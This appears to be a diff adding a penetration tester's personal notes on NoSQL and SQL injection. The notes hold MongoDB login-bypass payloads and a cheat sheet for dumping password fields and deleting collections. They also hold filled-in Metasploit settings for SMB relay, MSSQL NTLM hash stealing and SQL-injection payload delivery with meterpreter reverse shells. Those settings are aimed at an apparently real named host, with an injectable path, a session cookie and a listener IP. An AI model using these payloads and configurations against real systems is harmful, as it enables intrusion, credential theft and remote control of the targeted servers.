@@ -1,0 +1,105 @@
+NoSQLMap	SQLMap for NoSQL databases:
+		http://www.nosqlmap.net
+
+
+MongoDB Injection
+	|| 1==1		translates to the SQL or 1=1 always true syntax
+	// or <!--	use to comment out the end of a query
+
+	Login name field might look something like:
+
+		admin' || 1==1%00'
+		  or encoded version:
+		admin%27%20||%201==1%00%27
+			Browser will mess up encoding big time. Need to do in repeater
+
+
+
+
+NoSQL injection Cheat Sheet
+	db.getName() – Get current DB name
+	db.members.count() – Get number of documents in the collection
+	db.members.validate({ full : true}) – Get ALL information about this 
+		collection
+	db.members.stats() – Get information about this collection
+	db.members.remove() – remove all documents from current collection 	
+	db.members.find().skip(0).limit(1) – Get documents from DB (Change only 
+		number in skip() function)
+	db.getMongo().getDBNames().toString() – Get the list of all DBs
+	db.members.find()[0][‘pass’] – Get “pass” value from current collection
+
+
+SQL Injection Metasploit Links:
+	https://www.netspi.com/DesktopModules/SunBlog/Handlers/Print.aspx?id=139
+	https://www.secforce.com/blog/2011/01/penetration-testing-sql-injection-and-metasploit/
+	http://www.darkoperator.com/blog/2009/11/27/attacking-mssql-with-metasploit.html
+	https://www.offensive-security.com/metasploit-unleashed/scanner-mssql-auxiliary-modules/
+
+SQL Injection with SMB Relaying via Metasploit:
+	See above links for reference
+
+Module options (exploit/windows/smb/smb_relay):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   SHARE    tcz              yes       The share to connect to
+   SMBHOST  216.54.248.21    no        The target SMB server (leave empty for originating system)
+   SRVHOST  0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
+   SRVPORT  445              yes       The local port to listen on.
+
+
+Payload options (windows/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  thread           yes       Exit technique (Accepted: , , seh, thread, process, none)
+   LHOST     216.54.248.21    yes       The listen address
+   LPORT     4444             yes       The listen port
+
+
+exploit
+jobs
+
+
+
+Module options (auxiliary/admin/mssql/mssql_ntlm_stealer_sqli):
+
+   Name      Current Setting                                                                                                                                                        Required  Description
+   ----      ---------------                                                                                                                                                        --------  -----------
+   COOKIE    ASPSESSIONIDQQTCQQBT=ABAOFKMDCAAPOPIANIJCNKFC                            no        Cookie value
+   DATA                                                                                                                                                                             no        POST data, if necessary, with [SQLi] indicating the injection
+   GET_PATH  /indices/data/DataOutputExcel.xls?queryID=DWIndexHistory&isd_index=i2031010503&app=excel[SQLi]&lapses=EOM&Date=01.06.2015&Fixing=EU_EOD&to=01.06.2015&from=02.05.2015  yes       The complete path with [SQLi] indicating the injection
+   METHOD    GET                                                                                                                                                                    yes       GET or POST
+   Proxies                                                                                                                                                                          no        Use a proxy chain
+   RHOST     productsuat.markit.com                                                                                                                                                 yes       The target address
+   RPORT     443                                                                                                                                                                    yes       The target port
+   SMBPROXY  216.54.248.21                                                                                                                                                          yes       IP of SMB proxy or sniffer.
+   VHOST                             
+
+*****************************************************
+
+
+Module options (exploit/windows/mssql/mssql_payload_sqli):
+
+   Name      Current Setting                                                                                                                                                        Required  Description
+   ----      ---------------                                                                                                                                                        --------  -----------
+   COOKIE    ASPSESSIONIDQQTCQQBT=ABAOFKMDCAAPOPIANIJCNKFC                            no        Cookie value
+   DATA                                                                                                                                                                             no        POST data, if necessary, with [SQLi] indicating the injection
+   DELIVERY  OLD                                                                                                                                                                    yes       Payload delivery method (Accepted: PS, CMD, OLD)
+   GET_PATH  /indices/data/DataOutputExcel.xls?queryID=DWIndexHistory&isd_index=i2031010503&app=excel[SQLi]&lapses=EOM&Date=01.06.2015&Fixing=EU_EOD&to=01.06.2015&from=02.05.2015  yes       The complete path with [SQLi] indicating the injection
+   METHOD    GET                                                                                                                                                                    yes       GET or POST
+   Proxies                                                                                                                                                                          no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOST     productsuat.markit.com                                                                                                                                                 yes       The target address
+   RPORT     443                                                                                                                                                                    yes       The target port
+   VHOST                                                                                                                                                                            no        HTTP server virtual host
+
+
+Payload options (windows/patchupmeterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  process          yes       Exit technique (Accepted: , , seh, thread, process, none)
+   LHOST                      yes       The listen address
+   LPORT     4444             yes       The listen port
+
+
